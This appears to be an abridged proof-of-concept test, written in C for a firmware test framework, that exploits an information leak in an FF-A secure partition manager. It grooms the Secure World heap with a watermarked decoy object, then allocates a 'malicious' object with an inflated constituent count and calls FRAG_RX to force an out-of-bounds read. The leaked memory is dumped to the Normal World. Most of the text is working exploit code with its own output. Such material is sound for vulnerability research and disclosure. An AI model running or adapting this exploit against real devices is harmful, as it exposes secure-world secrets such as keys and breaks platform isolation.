...
test_result_t test_ffa_heap_leak(void)
{
    ...
    printf("[heap_leak] FF-A version: 0x%lx\n", (unsigned long)ver.fid);

    struct mailbox_buffers mb;
    GET_TFTF_MAILBOX(mb);

    /* 
     * Step 1: Allocate Decoy Object C with 200 valid constituents.
     * We place a watermark (0x42424242) in the 'reserved' field of each constituent.
     * The SPMC does not validate the 'reserved' field, but copies it to memory.
     */
    printf("[heap_leak] Step 1: Allocating Decoy Object C...\n");

    struct ffa_memory_region_constituent constituents_c[200];
    for (int i = 0; i < 200; i++) {
        constituents_c[i].address = (void *)(0x88010000ULL + i * 0x1000);
        constituents_c[i].page_count = 1; /* Valid for sum check */
        constituents_c[i].reserved = 0x42424242; /* THE WATERMARK */
    }
    ...
    if (ret.fid == FFA_ERROR) {
        printf("[heap_leak] Decoy Object C rejected: %ld\n", (long)ret.arg2);
        return TEST_RESULT_FAIL;
    }
    ffa_memory_handle_t handle_c = ffa_mem_success_handle(ret);
    printf("[heap_leak] Handle C: 0x%llx (Allocated with reserved=0x42424242)\n", (unsigned long long)handle_c);

    /* 
     * Step 2: Reclaim Decoy Object C.
     * Memory is freed, but the 0x42424242 pattern remains in the Secure World heap.
     */
    printf("[heap_leak] Step 2: Reclaiming Decoy Object C (Freeing memory)...\n");
    ...
    /* 
     * Step 3: Create Malicious Object A.
     * Real size is 112 bytes, but we set constituent_count = 200 (forces mrd_size ~3200).
     * It will occupy the exact memory space left by Object C.
     */
    printf("[heap_leak] Step 3: Allocating Malicious Object A...\n");
    ...
    /* Inject malicious constituent_count into Object A */
    ...
    /* FORCE OBJECT A TO BE INCOMPLETE */
    frag_len_a = 96; 

    ret = ffa_mem_share(total_len_a, frag_len_a);
    if (ret.fid != FFA_MEM_FRAG_RX) {
        printf("[heap_leak] Object A rejected: fid=0x%lx\n", (unsigned long)ret.fid);
        return TEST_RESULT_FAIL;
    }
    ffa_memory_handle_t handle_a = ffa_frag_handle(ret);
    printf("[heap_leak] Handle A: 0x%llx (Allocated over Object C remnants)\n", (unsigned long long)handle_a);

    /* 
     * Step 4: FRAG_RX(handle_A, 0)
     * SPMC will read 3200 bytes. It reads Object A's 112 bytes and overruns into the 0x42 pattern!
     */
    printf("[heap_leak] Step 4: FRAG_RX(handle_A, 0) to force 0x42 pattern read...\n");
    ...
    if (smc_ret.ret0 == FFA_ERROR) {
        printf("[heap_leak] FRAG_RX failed (SPMC blocked OOB): %ld\n", (long)smc_ret.ret2);
        return TEST_RESULT_FAIL;
    }

    uint32_t copy_size = (uint32_t)smc_ret.ret3;
    printf("[heap_leak] FRAG_RX OK! SPMC copied %u bytes to NWd!\n", copy_size);
    ...
    printf("[heap_leak] === LEAKED MEMORY DUMP ===\n");
    for (uint32_t w = 0; w < words; w++) {
        printf("[heap_leak] +%03u: 0x%016llx", w * 8, (unsigned long long)local_buf[w]);
        if ((local_buf[w] & 0xFFFFFFFF00000000ULL) == (PATTERN << 32) || 
            (local_buf[w] & 0x00000000FFFFFFFFULL) == PATTERN) {
            printf(" <-- PATTERN 0x42424242 FOUND! (Secure World Heap Leaked)");
        }
        printf("\n");
    }
